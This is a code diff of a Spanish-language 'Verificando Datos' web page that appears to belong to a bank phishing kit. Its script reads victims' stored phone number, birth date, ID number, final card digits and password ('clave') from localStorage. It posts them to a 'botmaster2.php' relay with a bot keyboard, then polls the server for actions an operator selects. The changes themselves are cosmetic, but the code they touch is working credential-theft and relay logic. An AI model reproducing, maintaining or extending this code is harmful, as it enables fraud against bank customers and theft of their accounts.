@@ -6,11 +6,8 @@
   <title>Verificando Datos</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      margin: 0; padding: 0;
+      display: flex; justify-content: center; align-items: center;
       height: 100vh;
       background: url('img/fondo.jpg') no-repeat center center fixed;
       background-size: cover;
@@ -69,15 +66,13 @@ document.addEventListener('DOMContentLoaded', async function () {
     return;
   }
 
-  const { token } = config;
   const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
-
   if (!data.celular || !data.nacimiento || !data.tipo || !data.identificador || !data.digitosFinales || !data.clave) {
     alert("Faltan datos. Redirigiendo...");
     return window.location.href = "index.html";
   }
 
-  const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
+  const transactionId = Date.now().toString(36) + Math.random().toString(36).substring(2);
   localStorage.setItem("transactionId", transactionId);
 
   const mensaje = `
@@ -99,7 +94,7 @@ document.addEventListener('DOMContentLoaded', async function () {
     ]
   };
 
-  // Solo enviar mensaje, sin getUpdates
+  // Enviar datos al bot
   await fetch("botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -107,7 +102,7 @@ document.addEventListener('DOMContentLoaded', async function () {
           "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  // Inicia la escucha del botón desde Webhook
+  // Escuchar acción seleccionada desde el servidor
   revisarAccion(transactionId);
 
   async function revisarAccion(txId) {
